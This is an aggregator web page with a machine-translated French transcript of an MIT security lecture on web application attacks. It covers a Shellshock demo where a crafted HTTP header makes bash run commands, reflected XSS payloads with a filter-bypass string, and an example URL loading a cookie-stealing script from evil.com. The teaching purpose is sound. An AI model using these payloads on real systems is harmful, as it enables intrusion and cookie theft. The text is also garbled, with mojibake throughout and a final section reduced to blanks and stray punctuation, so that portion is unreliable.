<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ’†ğŸ» ğŸ‘©ğŸ¿â€ğŸ¤ ğŸ‘‹ğŸ¾ Cours MIT "SÃ©curitÃ© des systÃ¨mes informatiques". ConfÃ©rence 9: SÃ©curitÃ© des applications Web, partie 1 ğŸš† ğŸ¤·ğŸ¾ ğŸš²</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Institut de technologie du Massachusetts. Cours magistral # 6.858. "SÃ©curitÃ© des systÃ¨mes informatiques." Nikolai Zeldovich, James Mickens. 2014 annÃ©e...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Cours MIT "SÃ©curitÃ© des systÃ¨mes informatiques". ConfÃ©rence 9: SÃ©curitÃ© des applications Web, partie 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ua-hosting/blog/424289/"><h3>  Institut de technologie du Massachusetts.  Cours magistral # 6.858.  "SÃ©curitÃ© des systÃ¨mes informatiques."  Nikolai Zeldovich, James Mickens.  2014 annÃ©e </h3><br>  Computer Systems Security est un cours sur le dÃ©veloppement et la mise en Å“uvre de systÃ¨mes informatiques sÃ©curisÃ©s.  Les confÃ©rences couvrent les modÃ¨les de menace, les attaques qui compromettent la sÃ©curitÃ© et les techniques de sÃ©curitÃ© basÃ©es sur des travaux scientifiques rÃ©cents.  Les sujets incluent la sÃ©curitÃ© du systÃ¨me d'exploitation (OS), les fonctionnalitÃ©s, la gestion du flux d'informations, la sÃ©curitÃ© des langues, les protocoles rÃ©seau, la sÃ©curitÃ© matÃ©rielle et la sÃ©curitÃ© des applications Web. <br><br>  Cours 1: Â«Introduction: modÃ¨les de menaceÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 2: Â«ContrÃ´le des attaques de piratesÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 3: Â«DÃ©bordements de tampon: exploits et protectionÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 4: Â«SÃ©paration des privilÃ¨gesÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 5: Â«D'oÃ¹ viennent les systÃ¨mes de sÃ©curitÃ©?Â» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> <br>  ConfÃ©rence 6: Â«OpportunitÃ©sÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 7: Â«Native Client SandboxÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 8: Â«ModÃ¨le de sÃ©curitÃ© rÃ©seauÂ» <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 3</a> <br>  ConfÃ©rence 9: Â«SÃ©curitÃ© des applications WebÂ», <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 3</a> <a name="habracut"></a><br><br>  CommenÃ§ons la deuxiÃ¨me confÃ©rence de notre impressionnante sÃ©rie d'histoires sur la sÃ©curitÃ© Web.  Je voudrais immÃ©diatement procÃ©der Ã  une dÃ©monstration rapide d'exemples, car vous savez que nos dÃ©mos ne fonctionnent presque jamais.  J'espÃ¨re que vous ne voyez pas d'Ã©cran vierge aujourd'hui. <br><br>  L'idÃ©e de base est que je voudrais d'abord vous montrer un exemple d'une erreur Shellshock dont vous avez peut-Ãªtre dÃ©jÃ  entendu parler.  C'Ã©tait un sujet assez populaire dans la littÃ©rature sur la sÃ©curitÃ© informatique. <br><br><img src="https://habrastorage.org/webt/kk/h0/hz/kkh0hzlvc4krqxabzmnwigajxo4.jpeg"><br><br>  Les gens attribuent Ã  une erreur Heartbleed une note maximale de 10 sur une Ã©chelle de danger 10. Ils considÃ¨rent que c'est l'erreur la plus dangereuse contre laquelle le systÃ¨me de sÃ©curitÃ© devrait se protÃ©ger.  Je pensais que ce serait une excellente idÃ©e de vous montrer une histoire vivante de ce problÃ¨me que vous pouvez raconter Ã  vos parents afin qu'ils comprennent que les Ã©tudes au Massachusetts Institute of Technology valent la peine. <br><br>  Alors, quelle est l'idÃ©e principale de l'erreur Shellshock?  C'est un trÃ¨s bon exemple de la raison pour laquelle il est si difficile de crÃ©er des applications Web sÃ©curisÃ©es qui couvrent plusieurs technologies, plusieurs langues, plusieurs systÃ¨mes d'exploitation, etc.  Par consÃ©quent, l'idÃ©e principale est que Shellshock utilise le fait qu'un attaquant peut crÃ©er une requÃªte http spÃ©ciale sur le serveur et gÃ©rer les en-tÃªtes de cette requÃªte.  J'ai Ã©crit un exemple trÃ¨s simple au tableau. <br>  Supposons qu'un attaquant veuille envoyer une demande GET Ã  un CGI sur le sujet de la recherche de chats, car c'est exactement ce que les gens recherchent toujours sur Internet (je plaisante).  Par consÃ©quent, il y aura un point d'interrogation et une sorte d'en-tÃªte d'hÃ´te standard avec une URL, par exemple, example.com: <br><br>  OBTENIR /querry.cgi?  recherche = chats <br>  HÃ´te: example.com <br>  PersonnalisÃ© - en-tÃªte: personnalisÃ© - valeur <br><br>  Notez maintenant qu'un attaquant peut Ã©galement spÃ©cifier des en-tÃªtes personnalisÃ©s.  Par exemple, je souhaite trouver un type d'en-tÃªte spÃ©cifique Ã  l'application appelÃ© Custom-header pour spÃ©cifier une valeur personnalisÃ©e, car l'application Web peut dÃ©finir des fonctionnalitÃ©s qui ne peuvent pas Ãªtre exprimÃ©es Ã  l'aide de simples en-tÃªtes HTTP prÃ©dÃ©finis.  Alors, tout cela semble plutÃ´t inoffensif. <br>  Mais au final, ce qui se passe, c'est que beaucoup de ces serveurs Web pour le traitement des scripts CGI acceptent rÃ©ellement ces valeurs personnalisÃ©es de l'en-tÃªte Custom-value et les utilisent pour dÃ©finir les variables d'environnement Bash.  Autrement dit, ils utiliseront cet en-tÃªte personnalisÃ© pour crÃ©er un en-tÃªte personnalisÃ© pour le nom de la variable Bash, ils prendront cette valeur personnalisÃ©e fournie par l'attaquant et l'utiliseront comme valeur de la variable Bash.  Une fois cette variable dÃ©finie, le serveur CGI effectuera un traitement du contexte de cet environnement. <br><br>  Et c'est mauvais parce que les serveurs Web ne devraient pas prendre de valeurs arbitraires Ã  partir de ces choses Â«salesÂ» alÃ©atoires.  Ainsi, dans un exemple spÃ©cifique d'une erreur Shellshock, ce qui se passe est que si vous donnez Ã  la variable Bash une valeur malveillante, une forme de folie peut commencer. <br><br><img src="https://habrastorage.org/webt/pt/e_/26/pte_26a2d3abmngljp3z9rwoiwa.jpeg"><br><br>  Fondamentalement, cette dÃ©finition malveillante d'une fonction est choisie dans le langage de script Bash, et vous ne devriez pas Ãªtre dÃ©rangÃ© par les spÃ©cificitÃ©s de ce processus.  Mais le fait est que si le paramÃ¨tre Bash Ã©tait correctement dÃ©fini, cette partie de / bin / id ne serait pas exÃ©cutÃ©e.  Vous venez donc de dÃ©finir une sorte de fonction stupide qui ne fait rien et met fin au processus de requÃªte. <br><br>  Cependant, cette sÃ©quence de caractÃ¨res confond l'analyseur Bash; il semble trÃ©bucher sur ce non-sens situÃ© aprÃ¨s la barre oblique.  Et puis il dit: "Oh, je pourrais continuer Ã  analyser et exÃ©cuter certaines commandes ici, non?"  Et dans ce cas, il exÃ©cute simplement la commande bin / id, qui affiche des informations sur l'utilisateur.  Mais l'essence de la vulnÃ©rabilitÃ© est qu'au lieu de bin / id, vous pouvez mettre absolument n'importe quel code ici! <br><br>  Je vais donner un exemple trÃ¨s simple que vous verrez Ã  l'Ã©cran.  Il s'agit d'un serveur Python trÃ¨s simple, le plus simple que vous puissiez imaginer.  J'utilise ici la mÃ©thode GET.  Cette mÃ©thode signifie l'itÃ©ration sur tous les en-tÃªtes HTTP dans la demande. <br><br><img src="https://habrastorage.org/webt/w4/3c/fw/w43cfwwaqjmmjxm78zug-oecus4.jpeg"><br><br><img src="https://habrastorage.org/webt/1m/mr/jf/1mmrjfhbdbu6-kpevbe24bsmhpg.jpeg"><br><br>  Ici, dans l'en-tÃªte, nous avons une valeur pour la variable K et une valeur pour la requÃªte V. Dans ce cas, GET affiche simplement les en-tÃªtes qu'il trouve. <br><br>  Et puis il va faire quelque chose de trÃ¨s stupide - faire un appel systÃ¨me et dÃ©finir la valeur du shell directement sur la valeur indiquÃ©e dans l'en-tÃªte.  C'est donc toute la racine de la vulnÃ©rabilitÃ©. <br><br>  Si je passe Ã  l'onglet suivant et lance le serveur Web de la victime, nous constatons qu'il est prÃªt Ã  accepter les demandes. <br><br><img src="https://habrastorage.org/webt/rk/jt/zg/rkjtzg52m6abnpspbgoyltcpzmc.jpeg"><br><br>  Ensuite, je peux Ã©crire mon client Shellshock spÃ©cial - il se trouve dans l'onglet suivant. <br><br><img src="https://habrastorage.org/webt/jv/jh/hc/jvjhhchuelxbtmdnkrdos_apl_0.jpeg"><br><br>  En fait, c'est assez simple - je viens de dÃ©finir une de ces lignes attack.str malveillantes, donc elle a d'abord de telles valeurs "courbes".  Et puis je sais juste que cÃ´tÃ© serveur tout se fera dÃ©sormais selon ma volontÃ©. <br><br>  Dans ce cas, j'ai utilisÃ© quelque chose d'inoffensif - en Ã©cho "Je possÃ¨de votre voiture".  Mais il pourrait y avoir n'importe quoi.  Vous pouvez exÃ©cuter un autre shell Bash avec le paramÃ¨tre Â«echo ATTACKER CMDÂ», c'est-Ã -dire la vÃ©ritable commande de l'attaquant, ce qui peut Ãªtre trÃ¨s dangereux. <br><br>  J'ai donc dÃ©fini les en-tÃªtes et la demande de l'utilisateur, puis j'utilise Python pour crÃ©er une connexion HTTP et l'envoyer simplement au serveur.  Que se passe-t-il finalement?  J'utilise mon client Shellshock ici. <br><br><img src="https://habrastorage.org/webt/li/y5/pf/liy5pfnb9rji1s51vi7vvwwn4bs.jpeg"><br><br>  Vous voyez, l'erreur 404 est apparue ici, car peu importe le fichier que j'ai demandÃ©, j'insÃ¨re juste ici une sorte d'index qui n'existe pas en HTML.  Mais si vous regardez ici, dans le deuxiÃ¨me onglet, oÃ¹ nous montrons le serveur Web de la victime qui a acceptÃ© de se connecter via le port 8282, nous verrons qu'il a reÃ§u mes messages "Je possÃ¨de votre voiture" et ATTACKER CMD. <br><br><img src="https://habrastorage.org/webt/6t/kf/yp/6tkfyptepbhu83ggs2shp_20dys.jpeg"><br><br>  Parce que dÃ¨s que le serveur de la victime a reÃ§u cet en-tÃªte, il a immÃ©diatement dÃ©fini les valeurs de la variable Bash et, par consÃ©quent, la commande ATTACKER CMD a Ã©tÃ© lancÃ©e.  Est-ce clair? <br><br>  <b>Public:</b> cela se produit-il si un programme commence par un tel titre? <br><br>  <b>Professeur:</b> oui.  Ainsi, les dÃ©tails du fonctionnement de l'attaque dÃ©pendent de l'apparence de votre serveur Web, par exemple, que vous travailliez avec Apache ou non.  Cet exemple est un peu tirÃ© par les cheveux, car j'ai en fait crÃ©Ã© un autre shell Bash, dÃ©fini une variable de shell et puis seulement commencÃ© le processus.  Mais vous pouvez imaginer que si vous crÃ©ez d'autres processus pour chaque connexion entrante, vous pouvez dÃ©finir directement la variable d'environnement. <br><br>  <b>Public:</b> Ainsi, si vous revenez au code du serveur web, il semble qu'il existe une vulnÃ©rabilitÃ© bien pire que Shellshock.  Parce que vous pouvez effectuer un appel systÃ¨me et exÃ©cuter la commande simplement en dÃ©finissant l'en-tÃªte personnalisÃ© sur autre chose, et je n'aurais pas Ã  utiliser l'erreur Shellshock dans cet exemple. <br><br>  <b>Professeur:</b> oui, c'est vrai, dans ce serveur Web particulier, que j'ai Ã©crit uniquement Ã  titre d'exemple, il y a une chose Ã  laquelle on ne peut faire confiance pour rien.  Mais si ici nous n'avions pas Python, mais Apache, alors nous pourrions directement dÃ©finir la valeur de l'environnement pour un service particulier en utilisant le paramÃ¨tre nth set.  Mais il existe des serveurs comme celui-ci qui crÃ©ent un processus distinct et font quelque chose de trÃ¨s similaire Ã  l'exemple donnÃ©. <br><br><img src="https://habrastorage.org/webt/js/s4/zz/jss4zz4vwyw6dqz-4s0kzwlr-uy.jpeg"><br><br>  Un autre exemple que je voulais vous donner est l'exemple du scriptage intersite.  Le bug de Shellshock Ã©tait une sorte d'exemple de l'importance de la dÃ©sinfection du contenu.  Nous avons discutÃ© du fait que vous ne devez pas simplement accepter les contributions de personnes alÃ©atoires et les utiliser directement dans des Ã©quipes de tout type. <br><br>  Les scripts intersites sont un autre exemple montrant pourquoi quelque chose pourrait mal se passer.  Dans cet exemple, j'ai un autre serveur CGI simple Ã©crit en Python. <br><br><img src="https://habrastorage.org/webt/lp/oo/aw/lpooaw-togbyuns6zaxta0lp6ei.jpeg"><br><br>  Il s'agit du descripteur qui est exÃ©cutÃ© lorsqu'une demande est reÃ§ue du client.  J'ai imprimÃ© quelques en-tÃªtes ici pour la rÃ©ponse, et ma rÃ©ponse sera du texte HTML.  Il s'avÃ¨re que les navigateurs disposent de certains mÃ©canismes de sÃ©curitÃ© pour essayer de prÃ©venir l'attaque que je vais vous montrer.  Par consÃ©quent, j'ai permis de dÃ©sactiver certains des mÃ©canismes de cette protection en plaÃ§ant cette barre de titre au dÃ©but. <br><br>  Le script CGI accÃ¨de ensuite Ã  tous les champs et demandes CGI, en commenÃ§ant par la ligne form = cgi.FieldStorage ().  Imaginez que tout ce qui se trouve dans la ligne aprÃ¨s ce point d'interrogation reprÃ©sente le titre et les paramÃ¨tres de notre exemple: <br><br>  OBTENIR /querry.cgi?  recherche = chats <br>  HÃ´te: example.com <br>  PersonnalisÃ© - en-tÃªte: personnalisÃ© - valeur <br><br>  Ensuite, le script cgi fait une chose trÃ¨s simple - il imprime immÃ©diatement la valeur de quelque chose qui vient de l'attaquant.  C'est la mÃªme idÃ©e de base, et c'est une mauvaise idÃ©e, car cette fonction d'impression imprime la valeur rÃ©sultante directement dans le HTML lui-mÃªme. <br><br>  Ici, les Ã©vÃ©nements suivants peuvent se produire.  Supposons que j'ai un tas de requÃªtes que je veux exÃ©cuter.  Dans cette premiÃ¨re demande, je mets simplement la valeur du message Ã  Bonjour, c'est-Ã -dire que je vais Ã  l'adresse de la premiÃ¨re ligne. <br><br><img src="https://habrastorage.org/webt/q2/xl/ng/q2xlngmnjiyfdvdytmh2gfdoymq.jpeg"><br><br>  Par consÃ©quent, si je vais sur ma page, je verrai le mot bonjour dessus, car le serveur accepte directement ce que je lui transmets et imprime Â«bonjourÂ».  Donc pas de surprise. <br><br><img src="https://habrastorage.org/webt/1t/0n/ak/1t0nakmsjq1emmcqj03bs9sosq0.jpeg"><br><br>  Je comprends que je peux vraiment y passer du code HTML arbitraire, et si je dÃ©finis le format d'en-tÃªte sur h1, c'est-Ã -dire que j'enverrai la deuxiÃ¨me ligne se terminant par bonjour au serveur, cela changera Ã©galement sur la page - vous voyez, le style de mot a changÃ© pour le style d'en-tÃªte h1.  Donc Ã§a marche, je tape les valeurs directement dans la page. <br><br><img src="https://habrastorage.org/webt/gm/qy/mv/gmqymv3fbxpjzkxa5wwdvijx7vu.jpeg"><br><br>  GÃ©nial, maintenant nous sommes en affaires, et c'est cool.  Maintenant, ajoutons simplement le code JavaScript, c'est-Ã -dire que nous exÃ©cuterons la troisiÃ¨me ligne prÃ©parÃ©e par moi dans le navigateur, oÃ¹ un certain script est insÃ©rÃ©, qui s'exÃ©cute aprÃ¨s le paramÃ¨tre d'alerte ("XSS"). <br><br>  Alors maintenant, nous voyons un Ã©cran vide.  Il semble que nous n'ayons pas rÃ©ussi, car aucune sortie n'est visible, et je n'ai remarquÃ© aucun avertissement. <br><br><img src="https://habrastorage.org/webt/hd/mo/qr/hdmoqr8xk5ehtmumjddzqwrquns.jpeg"><br><br>  Mais si je regarde la sortie du serveur Web, je verrai que le serveur Web lui-mÃªme n'a pas rÃ©ellement reÃ§u cette balise de script finale.  Il semble que le navigateur lui-mÃªme ait dÃ©tectÃ© quelque chose de mal, bien que j'aie essayÃ© de dÃ©sactiver le filtre XSS.  C'est donc assez intÃ©ressant.  Plus tard, nous examinerons de plus prÃ¨s ce mÃ©canisme de protection, mais pour l'instant, je noterai que le navigateur essaie de rÃ©sister Ã  une attaque de script intersite. <br><br>  Mais vous pouvez profiter du fait que HTML, CSS et JavaScript sont des langages extrÃªmement complexes, et ils sont Ã©crits d'une maniÃ¨re difficile Ã  comprendre.  J'en profiterai et utiliserai la derniÃ¨re, quatriÃ¨me ligne de mon entrÃ©e, en la plaÃ§ant dans la barre d'adresse du navigateur.  Il s'agit d'une chaÃ®ne d'attaque contenant une URL non valide.  Il inclut l'URL de l'image &lt;IMG â€œâ€ â€&gt; et la balise de scriptâ€&gt; et ne peut en fait pas Ãªtre analysÃ©.  Par consÃ©quent, Ã  la rÃ©ception d'une telle ligne, le navigateur est simplement confus et affiche des informations Ã  l'Ã©cran: Â«La page Ã  127.0.0.1:8282 dit: XSSÂ».  Ainsi, la dÃ©tection de script intersite intÃ©grÃ©e ne fonctionne pas rÃ©ellement. <br><br><img src="https://habrastorage.org/webt/zh/sa/df/zhsadfxqyr1nqiwiy8atytitmou.jpeg"><br><br>  Si nous cliquons sur le bouton Â«OKÂ», nous aurons juste une page vierge.  Mais si vous regardez son contenu, nous verrons des citations et des crochets incomprÃ©hensibles qui viennent de nulle part. <br><br><img src="https://habrastorage.org/webt/za/qi/yp/zaqiyp6lxm9damgqbidbi7ess3u.jpeg"><br><br>  Cependant, du point de vue de l'attaquant, la page endommagÃ©e n'a pas d'importance, car nous avons vu un avertissement, ce qui signifie que le code a Ã©tÃ© lancÃ©.  Et il pourrait Ãªtre utilisÃ© pour voler des cookies ou faire quelque chose comme Ã§a. <br><br>  <b>Public:</b> quel est l'aspect intersite? <br><br>  <b>Professeur: L'</b> aspect intersite est que si un attaquant peut convaincre un utilisateur d'aller sur une URL, comme dans cet exemple, alors c'est lui qui dÃ©termine le contenu du message.  C'est lui qui crÃ©e l'avertissement XSS ou quelque chose comme Ã§a.  Essentiellement, ce qui se passe, c'est que la page de la victime exÃ©cute du code au nom de quelqu'un qui ne gÃ¨re pas cette page. <br><br>  Je vous ai donc montrÃ© deux dÃ©monstrations rapides du monde Â«saleÂ» dans lequel nous vivons.  Alors pourquoi les scripts intersites sont-ils si courants?  Pourquoi ces problÃ¨mes sont-ils si importants?  La raison en est que les sites Web deviennent de plus en plus dynamiques et qu'ils souhaitent hÃ©berger plusieurs contenus gÃ©nÃ©rÃ©s par les utilisateurs ou inclure du contenu provenant d'autres domaines.  Pensez, par exemple, Ã  la section des commentaires d'un article de presse, ces commentaires proviennent de personnes peu fiables - d'utilisateurs.  D'une maniÃ¨re ou d'une autre, ces sites devraient dÃ©terminer quelles sont les rÃ¨gles pour combiner de telles choses. <br><br>  Les sites Web peuvent contenir des documents utilisateur, tels que des documents Google ou Office 365. Tous ces documents proviennent de personnes peu fiables, mais ils doivent en quelque sorte s'entendre les uns avec les autres et avec la grande infrastructure de Google ou Microsoft. <br><br>  Quels types de scÃ©narios de sÃ©curitÃ© intersites pouvons-nous utiliser?  Un type de protection consiste en des filtres de script intersite dans le navigateur lui-mÃªme.  Ces filtres tenteront de dÃ©tecter d'Ã©ventuelles attaques de script intersite.  Et nous avons vu l'un de ces filtres en action - c'Ã©tait le troisiÃ¨me exemple du scÃ©nario que nous avons examinÃ©. <br>  Supposons que vous ayez l'URL <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">foo.com/?q=</a> &lt;script src = "evil.com/cookie stealer.js"&gt;.  Autrement dit, cette adresse exÃ©cute un script qui redirige l'utilisateur vers un site malveillant et lui vole des cookies. <br><br><img src="https://habrastorage.org/webt/no/hf/b_/nohfb_nyupptbxwj4luk1whqgpw.jpeg"><br><br>  Ainsi, le navigateur refusera de l'exÃ©cuter et l'astuce de cet attaquant ne fonctionnera pas.  La raison est simple - le navigateur a juste vÃ©rifiÃ© s'il y avait une <code>&lt;script&gt;</code> intÃ©grÃ©e dans cette URL et, l'ayant trouvÃ©e, a interdit de cliquer sur ce lien.  Ainsi, c'est une heuristique trÃ¨s simple pour savoir si quelque chose de dangereux se produit, car aucun dÃ©veloppeur normal ne mettra de telles choses dans l'adresse.  Vous pouvez configurer les options de configuration de votre navigateur pour activer ou dÃ©sactiver de telles choses.  Cela est parfois utile pour les tests si vous voulez simplement saisir rapidement et sans trop de vÃ©rification certaines donnÃ©es JavaScript.  Mais gÃ©nÃ©ralement, cette vÃ©rification dans le navigateur est activÃ©e par dÃ©faut. <br><br>  Par exemple, Chrome et IE ont un filtre intÃ©grÃ© qui examine la valeur de l'URL dans la barre d'adresse et recherche des choses similaires.  Et s'ils sont lÃ , le navigateur peut essayer de les supprimer complÃ¨tement ou de vider la source Ã  l'intÃ©rieur de &lt;&gt;.  Il existe de nombreuses mÃ©thodes d'analyse heuristique basÃ©es sur les navigateurs qui devraient dÃ©tecter de telles choses.  Et si vous regardez le site Web OWASP, il existe des exemples d'utilisation d'une telle heuristique pour dÃ©tecter les scripts intersites et des exemples de la faÃ§on de contourner ce filtre. <br><br>  Vous savez, c'Ã©tait trÃ¨s drÃ´le, car au dÃ©but, comme exemple pour notre confÃ©rence, j'ai fait quelque chose de similaire et cela n'a pas fonctionnÃ©.  Ensuite, j'ai regardÃ© dans la feuille de triche OWASP et j'ai trouvÃ© la quatriÃ¨me option qui fonctionnait, c'Ã©tait un exemple avec une analyse cassÃ©e de l'adresse d'image img. <br><br>  Ainsi, le principal problÃ¨me, qui ne vous permet pas de simplement vous fier aux filtres de navigateur intÃ©grÃ©s, est qu'il existe de nombreuses faÃ§ons diffÃ©rentes de forcer les analyseurs CSS et HTML Ã  analyser certains contenus de maniÃ¨re incorrecte.  Les solutions embarquÃ©es ne sont donc pas parfaites, elles ne couvrent pas toutes les vulnÃ©rabilitÃ©s. <br><br>  <b>Public:</b> Mais n'est-ce pas la responsabilitÃ© du navigateur de vÃ©rifier de telles choses? <br><br>  <b>Professeur:</b> Je veux dire le cas lorsque le navigateur est sur un serveur proxy et que le proxy fait quelque chose comme indiquÃ© dans cet exemple.  Autrement dit, les filtres intÃ©grÃ©s ont du sens, car il peut y avoir de nombreux analyseurs Ã  l'intÃ©rieur du navigateur, et ces filtres sont utilisÃ©s pour protÃ©ger les couches de gestionnaire Ã  l'intÃ©rieur du navigateur. <br><br>  <b>Public:</b> Je pense que nous pouvons dire qu'il est de la responsabilitÃ© du dÃ©veloppeur Web, et non de l'utilisateur, de vÃ©rifier ces choses. <br><br>  <b>Professeur:</b> dans un certain sens, nous pourrions dire que sous Unix ou Windows, il existe Ã©galement des processus dont le dÃ©veloppeur de logiciels, et non l'utilisateur, devrait s'occuper, et le dÃ©veloppeur devrait s'assurer que ces choses restent isolÃ©es.  Mais en rÃ©alitÃ©, le systÃ¨me d'exploitation et le matÃ©riel jouent Ã©galement un rÃ´le important, car sinon, on ne pourrait pas faire confiance aux programmes crÃ©Ã©s par des dÃ©veloppeurs alÃ©atoires.  Mais fondamentalement, vous avez raison.  En fait, des frameworks comme Django ou quelque chose de similaire essaient de vous aider Ã  contourner certains de ces problÃ¨mes. <br><br>  D'une maniÃ¨re ou d'une autre, les filtres ne sont pas une solution idÃ©ale et ne peuvent pas empÃªcher ce que l'on appelle des attaques de script intersites persistantes ou persistantes, XSS persistantes.  C'est une sorte de rÃ©flexion, car le code du script Â«vitÂ» simplement dans l'URL.  DÃ¨s que l'utilisateur a fermÃ© cette URL, l'attaque a pris fin. <br><br>  Mais imaginez qu'un utilisateur a placÃ© du code HTML malveillant dans la section des commentaires de votre site.         ,          .           ,      . <br><br><img src="https://habrastorage.org/webt/ve/bq/zh/vebqzhebjjzb__fbvhmhga2tav0.jpeg"><br><br>  ,     â€“   .           HTML-   . <br><br>    ?  - ,          .        HTML,   ,       .         . <br><br> <b>:</b>  ,    , ,  ,           -   ? <br><br> <b>:</b>    ,      .   ,     â€” post.  ,   ,   XML HTTP . <br><br> <b>:</b>      ,          ,  â€¦ <br><br> <b>:</b> ,     ,      .  ,                 .      - ,    . <br><br>  ,    ,         . <br><br>       ,   Â« HTTP Â»,  HTTP-only cookie.     ,     ,    JavaScript        cookie.  ,  ,          , : Â«,    ,  JavaScript,     cookieÂ»!         - . <br><br>     ,        ,    .     ,      .  ,    JavaScript     cookie,     - , ,  URL-  -   , , buy.com.      , 